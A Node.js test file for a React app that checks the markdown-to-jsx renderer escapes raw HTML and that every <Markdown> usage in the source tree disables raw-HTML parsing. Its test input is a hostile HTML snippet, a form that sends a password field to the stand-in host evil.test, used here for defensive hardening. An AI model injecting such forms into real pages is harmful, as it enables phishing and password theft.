const { describe, test } = require('node:test')
const assert = require('node:assert/strict')
const fs = require('node:fs')
const path = require('node:path')

const React = require('react')
const { renderToStaticMarkup } = require('react-dom/server')
const Markdown = require('markdown-to-jsx/react').default

const EVIL = '<form action="https://evil.test"><input name="pw"></form>'
const render = props =>
    renderToStaticMarkup(React.createElement(Markdown, props, EVIL))

describe('markdown raw-HTML hardening (M2)', () => {
    test('disableParsingRawHTML renders raw HTML as text, not DOM', () => {
        const out = render({ options: { disableParsingRawHTML: true } })
        assert.ok(!out.includes('<form'), 'raw <form> must not be rendered')
        assert.match(out, /&lt;form/) // shown as escaped text instead
    })

    test('control: without the option the library WOULD render the HTML', () => {
        // Guards against a library upgrade silently changing behavior: if this
        // stops rendering <form>, the option above may no longer be doing work.
        const out = render(null)
        assert.ok(out.includes('<form'))
    })

    test('every <Markdown> sink in src/ passes disableParsingRawHTML', () => {
        // Scan the whole tree, not a fixed list, so a NEW <Markdown> added
        // anywhere is caught -- that is how this vuln class reappears.
        const srcDir = path.join(__dirname, '..', '..', 'src')
        const walk = dir =>
            fs.readdirSync(dir, { withFileTypes: true }).flatMap(e => {
                const full = path.join(dir, e.name)
                if (e.isDirectory()) return walk(full)
                return /\.jsx?$/.test(e.name) ? [full] : []
            })

        let found = 0
        for (const file of walk(srcDir)) {
            const src = fs.readFileSync(file, 'utf8')
            for (const tag of src.match(/<Markdown[^>]*>/gs) || []) {
                found++
                assert.match(
                    tag,
                    /disableParsingRawHTML:\s*true/,
                    `${file}: a <Markdown> lacks disableParsingRawHTML`
                )
            }
        }
        assert.ok(found >= 4, `expected >= 4 <Markdown> sinks, found ${found}`)
    })
})
